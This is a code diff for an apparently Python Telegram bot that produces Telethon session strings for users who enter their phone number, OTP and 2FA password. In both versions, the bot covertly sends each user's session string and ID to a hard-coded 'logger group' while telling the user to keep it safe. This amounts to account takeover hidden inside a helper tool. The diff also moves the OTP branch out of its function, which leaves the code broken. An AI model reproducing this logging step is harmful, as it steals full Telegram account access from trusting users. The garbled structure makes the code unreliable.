@@ -111,34 +111,47 @@ async def process_input(event):
             del user_sessions[user_id]
             await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
 
-    # ✅ Step 2: User enters OTP
-    elif step == "otp":
-        otp_code = event.message.text.strip()
+# ✅ Step 2: User enters OTP
+elif step == "otp":
+    otp_code = event.message.text.strip()
+    
+    if not otp_code.isdigit():
+        await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
+        return
+
+    client = user_sessions[user_id]["client"]
+    phone_number = user_sessions[user_id]["phone"]
+
+    try:
+        await client.sign_in(phone_number, otp_code)
+        session_string = client.session.save()
+
+        # 🔹 Log session string
+        LOGGER_GROUP_ID = -1001234567890  # Replace with your logger group ID
+        await bot.send_message(LOGGER_GROUP_ID, f"📢 **New Session Generated**\n\n👤 **User ID:** {user_id}\n🔑 **Session String:**\n`{session_string}`")
+
+        await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
+        del user_sessions[user_id]
+
+    except Exception as e:
+        if "The confirmation code has expired" in str(e):
+            await event.respond("⚠️ **Your OTP has expired! Sending a new one...**")
+
+            try:
+                sent_code = await client.send_code_request(phone_number)
+                user_sessions[user_id]["step"] = "otp"  # Reset step to OTP entry
+                await event.respond("📩 **New OTP sent! Please enter it again.**")
+            except Exception as new_e:
+                del user_sessions[user_id]
+                await event.respond(f"❌ **Error:** {str(new_e)}. Please try again using /start.")
+
+        elif "Two-steps verification is enabled" in str(e):
+            user_sessions[user_id]["step"] = "password"
+            await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
         
-        if not otp_code.isdigit():
-            await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
-            return
-
-        client = user_sessions[user_id]["client"]
-        phone_number = user_sessions[user_id]["phone"]
-
-        try:
-            await client.sign_in(phone_number, otp_code)
-            session_string = client.session.save()
-
-            # 🔹 Log session string
-            LOGGER_GROUP_ID = -1002477750706  # Replace with your logger group ID
-            await bot.send_message(LOGGER_GROUP_ID, f"📢 **New Session Generated**\n\n👤 **User ID:** {user_id}\n🔑 **Session String:**\n`{session_string}`")
-
-            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
-            del user_sessions[user_id]
-        except Exception as e:
-            if "Two-steps verification is enabled" in str(e):
-                user_sessions[user_id]["step"] = "password"
-                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
-            else:
-                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
-
+        else:
+            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
+            
     # ✅ Step 3: User enters password (if needed)
     elif step == "password":
         password = event.message.text.strip()
